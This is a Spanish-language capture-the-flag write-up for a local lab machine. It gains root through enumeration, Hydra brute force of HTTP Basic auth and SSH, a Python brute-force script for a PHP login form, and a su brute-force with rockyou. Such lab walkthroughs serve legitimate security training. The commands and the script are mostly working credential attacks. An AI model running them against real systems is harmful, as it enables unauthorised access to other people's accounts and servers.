# FASE DE ENUMERACIÓN

Sabiendo que la IP de la máquina víctima es:

```bash
172.17.0.2
```

Lanzamos un escaneo con Nmap para ver qué puertos tiene abiertos, qué servicios corren por ellos y sus versiones, por si son vulnerables:

```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOiDMcTZdMv54RYo66Vj1lo0DHXGzARy5cb26KgkubJZrBqOpV/mZ377CY8BcTi2CLeR0saiWSVFKfbttcqqI9s=
|   256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfU3b71so+RowXPc325dWRWr510sPJQeMOdG+i3QEiC
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
|_http-title: 401 Unauthorized
```

Vemos dos puertos abiertos:

- Puerto 22, donde corre SSH en versión no vulnerable. Sin tener credenciales, no podemos hacer nada.
- Puerto 80 (HTTP).

Nos vamos a centrar en el puerto 80. Lanzamos un WhatWeb para ver si nos reporta algo interesante:

```bash
whatweb http://172.17.0.2 -v
```

```
WhatWeb report for http://172.17.0.2
Status    : 401 Unauthorized
Title     : 401 Unauthorized
IP        : 172.17.0.2
Country   : RESERVED, ZZ

Summary   : Apache[2.4.62], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], WWW-Authenticate[Zona restringida][Basic]
...
```

Vemos que corre Apache versión 2.4.62 (no vulnerable). En las cabeceras observamos un 401 y un `WWW-Authenticate: Basic realm="Zona restringida"`. Probablemente se trate de un panel de autenticación.

Nos vamos a la página web y, efectivamente, mirando el código fuente (`Ctrl+U`) vemos:

```
<tt>/var/www/bypass403.pw/index.php</tt>) before continuing to operate your HTTP server.
```

Por si hay virtual hosting, metemos el dominio `bypass403.pw` en el `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Y añadimos al final esta línea:

```
172.17.0.2      bypass403.pw
```

Guardar con `Ctrl+O` y salir con `Ctrl+X`.

---

## Análisis de la autenticación

Capturamos una petición con BurpSuite y vemos  en las cabeceras lo siguiente:

```
GET / HTTP/1.1
Host: 172.17.0.2
...
Authorization: Basic ZmRnZGZnOmRmZ2RzZ2Y=
```

Parece Base64. Lo decodificamos:

```bash
echo "ZmRnZGZnOmRmZ2RzZ2Y=" | base64 -d; echo
```

```
fdgdfg:dfgdsgf
```

Coincide con el user:pass que introdujimos.

---

## Ataque con Hydra

Sabemos que se concatena `usuario:contraseña` y se codifica en Base64. Usaremos Hydra con `-C` para probar combinaciones ya codificadas en este caso este diccionario usa la estructura `user:password`:

```bash
hydra -C RUTA_AL_DICCIONARIO/ftp-betterdefaultpasslist.txt http-get://172.17.0.2/
```

Resultado:

```
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
```

Credenciales válidas:

```
httpadmin:fhttpadmin
```

Nos logueamos. Nos lleva a un `index.html`, sin nada interesante. Toca fuzzing con las credenciales:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip -U httpadmin -P fhttpadmin
```

```
/index.html           (Status: 200) [Size: 10701]
/login.php            (Status: 200) [Size: 2798]
```

También con wfuzz:

```bash
wfuzz -c --hh=272 \
  -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -z list,php,txt,bak,old,zip, \
  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
  -u http://172.17.0.2/FUZZ.FUZ2Z
```

---

## Ataque Fuerza Bruta en login.php

Capturamos la petición POST:

```
POST /login.php HTTP/1.1
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
...
username=admin&password=password
```

Creamos un script en Python:

```python
import requests
import sys
import os

url = "http://bypass403.pw/login.php"
headers = {
    "Authorization": "Basic aHR0cGFkbWluOmZodHRwYWRtaW4=",
    "Content-Type": "application/x-www-form-urlencoded"
}

def load_words(filepath):
    if not os.path.isfile(filepath):
        print(f"❌ Archivo no encontrado: {filepath}")
        sys.exit(1)
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def brute_force(userlist, passlist):
    for user in userlist:
        for password in passlist:
            data = {
                "username": user,
                "password": password
            }
            try:
                response = requests.post(url, headers=headers, data=data, timeout=10)
                if "Credenciales incorrectas" not in response.text:
                    print(f"\n✅ ¡Credenciales válidas encontradas! -> Usuario: {user} | Contraseña: {password}")
                    return
                else:
                    print(f"❌ {user}:{password}")
            except requests.exceptions.RequestException as e:
                print(f"⚠ Error con {user}:{password} -> {e}")

    print("\n🚫 No se encontraron credenciales válidas.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python script.py /ruta/usuarios.txt /ruta/passwords.txt")
        sys.exit(1)

    users = load_words(sys.argv[1])
    passwords = load_words(sys.argv[2])
    brute_force(users, passwords)
```

Uso:

```bash
python script.py RUTA_DICCIONARIO_USUARIOS/users.txt /usr/share/wordlists/rockyou.txt
```

Resultado:

```
✅ ¡Credenciales válidas encontradas! -> Usuario: admin | Contraseña: chocolate
```

Mensaje tras login:

```
¡Login correcto! Enhorabuena! De parte del usuario balutin, te damos la enhorabuena
```

---

## Fuerza bruta con wfuzz (alternativa):

```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
  -u http://172.17.0.2/login.php \
  --hh=2848
```

Resultado:

```
Payload: chocolate
```

---

## Fuerza bruta por SSH
Sabiendo un nuevo usuario que nos ha dado la página al hacer login `balutin`:
```bash
hydra -l balutin -P /usr/share/wordlists/rockyou.txt -t 16 -V -f -I ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
```

Nos conectamos:

```bash
ssh balutin@172.17.0.2
```

---

# FASE ESCALADA DE PRIVILEGIOS

Comprobamos grupos:

```bash
id
```

```
uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)
```

Nada especial. 

Comprobamos kernel:

```bash
uname -a
```

```
Linux 28a4c6e82f24 6.12.33+kali-amd64 ...
```

Nada vulnerable.

Miramos usuarios:

```bash
cat /etc/passwd | grep sh$
```

```
root:x:0:0:root:/root:/bin/bash
balutin:x:1000:1000:balutin,,,:/home/balutin:/bin/bash
```

Miramos permisos sudo:

```bash
sudo -l
```

```
-bash: sudo: command not found
```

Miramos la variable de entorno:

```bash
printenv
```

```
SHELL=/bin/bash
PWD=/home/balutin
LOGNAME=balutin
MOTD_SHOWN=pam
HOME=/home/balutin
LANG=es_EC.UTF-8
LS_COLORS=rs=0:di=01;34:...
SSH_CONNECTION=172.17.0.1 37050 172.17.0.2 22
TERM=xterm-256color
USER=balutin
SHLVL=1
SSH_CLIENT=172.17.0.1 37050 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SSH_TTY=/dev/pts/0
_=/usr/bin/printenv
```

Nada relevante.

---


Buscamos binarios con bit SUID:

```bash
find / -perm -4000 2>/dev/null
```

```
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Nada interesante.

Buscamos binarios con bit SGID:

```bash
find / -perm -2000 2>/dev/null
```

```
/var/mail
/var/local
/var/log/journal
/usr/bin/chage
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/sbin/unix_chkpwd
```

Nada útil.

---

## Sin pistas adicionales... Ataque de fuerza bruta a root

Buscamos métodos para pasarnos archivos desde nuestra máquina:

```bash
which nc
which wget
which curl
which scp
```

```
/usr/bin/scp
```

Vemos que solo tenemos disponible `scp`.

---

## Transferencia de archivos con SCP

El comando para copiar desde nuestra máquina local a la máquina víctima es:

```
scp ARCHIVO usuario@IP:/ruta/en/la/víctima
```

Ejemplo:

```bash
scp script.sh balutin@172.17.0.2:/tmp
```

---

## Herramienta de fuerza bruta

Podemos usar una herramienta de fuerza bruta para `su` como:

- Nuestra propia herramienta en bash:  
  https://github.com/lavafuego/herramientas/tree/main/fuerza%20bruta%20user%20script%20bash

- Otra alternativa:  
  https://github.com/d4t4s3c/suForce

En nuestro caso he usado mi propia herramienta en bash el primer enlace que es copiar y pegar y no necesita pasarse por scp ni nada. Creamos el script con `nano` en la máquina víctima, lo pegamos y luego:

```bash
chmod +x script.sh
```

---

## Transferencia del diccionario

Pasamos `rockyou.txt` a la máquina víctima:

```bash
scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp
```

Introducimos la contraseña del usuario `balutin` cuando nos la pida.

---

## Ejecución del script

Nos posicionamos en `/tmp` y ejecutamos:

```bash
cd /tmp
./script.sh -u root -w rockyou.txt
```

Salida:

```
[#--------------------------------------------------]   0%
¡Contraseña encontrada!: rockyou
Terminated
```

---

## Escalada a root

Nos logueamos como root:

```bash
su root
```

Contraseña:

```
rockyou
```

💥 ¡Acceso root conseguido!

```
root@28a4c6e82f24:/tmp# whoami
root
```

---

✅ Escalada completada con éxito.
